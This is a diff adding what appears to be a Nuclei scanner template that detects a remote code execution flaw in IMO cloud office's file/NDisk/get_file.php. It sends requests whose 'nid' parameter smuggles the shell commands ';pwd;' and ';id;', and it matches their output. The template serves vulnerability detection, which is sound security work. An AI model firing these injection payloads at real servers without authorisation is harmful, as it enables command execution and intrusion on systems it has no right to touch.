@@ -1,0 +1,58 @@
+id: imo-rce
+
+info:
+  name: IMO - Remote Code Execution
+  author: ritikchaddha
+  severity: critical
+  description: |
+    The lax filtering of imo cloud office/file/NDisk/get_file.php allows unlimited file uploads. Attackers can directly obtain website permissions through this vulnerability.
+  reference:
+    - https://www.henry4e36.top/index.php/archives/130.html#cl-1
+    - https://forum.butian.net/article/213
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  metadata:
+    max-request: 3
+  tags: imo,rce,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'imo'
+        case-insensitive: true
+        internal: true
+
+  - raw:
+      - |
+        GET /file/NDisk/get_file.php?cid=1&nid=;pwd; HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /file/NDisk/get_file.php?cid=1&nid=;id; HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_1
+        regex:
+          - 'home/www/html/[^"]*/file/NDisk'
+
+      - type: regex
+        part: body_2
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
+# digest: 490a004630440220058497202047e0112f48c8b28f7c6e6b4176664f4d9fa13c0d68faa5cb530bd1022057fbbdc8102b7a80c61520f2c4f7608d84bf1feb0bf7044f16da4600408bf6d3:922c64590222798bb761d5b6d8e72950
